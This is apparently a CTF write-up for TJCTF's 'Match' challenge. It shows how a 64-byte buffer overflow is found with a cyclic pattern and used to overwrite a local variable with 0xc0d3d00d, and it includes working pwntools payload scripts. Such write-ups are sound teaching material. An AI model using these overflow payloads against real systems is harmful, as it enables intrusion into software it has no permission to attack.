---
tags: [_BOF, TJCTF]
title: Match
created: '2020-05-31T08:45:55.777Z'
modified: '2020-05-31T13:44:09.966Z'
---

# Match
## Solving
- `NX enabled`, stack is not executable! 
- The input function reads $16 * param2$ into $param1$, for the `Tinder Bio` input, the buffer is $64$ bytes big but $param2 = 8$, which means that it reads $16 * 8 = 128$ bytes and we have a BoF of $64$ bytes
- We get the flag when $local\_14 = 0xc0d3d00d$

We use a cyclic string to find the offset from our overflow to `local_14`, which is $52$
After the padding, we include `0xc0d3d00d` and that works!
## Commands
- `file match`:`match: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20dc2329afce6884ca6bdae371f7af93bee637d5, with debug_info, not stripped`
- `checksec match`: `NX enabled`
## Exploit
### Find offset
```python
from pwn import *
cyclic(64)
cyclic_find(b'naaa')
``` 
```bash
python3 -c "print(
  'a\n' * 3 + # Get past first 3 inputs
  'b' * 64 + # Fill buffer of bio
  'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa' # Cyclic to check where the padding needed to overwrite local_14
);" > input.txt
```
### Exploit
```bash
python -c "import pwn; print(
  'a\n' * 3 + # Get past first 3 inputs
  'b' * 64 + # Fill buffer of bio
  'c' * 52 + # Padding to local_14
  pwn.p32(0xc0d3d00d)
);" > input.txt
```
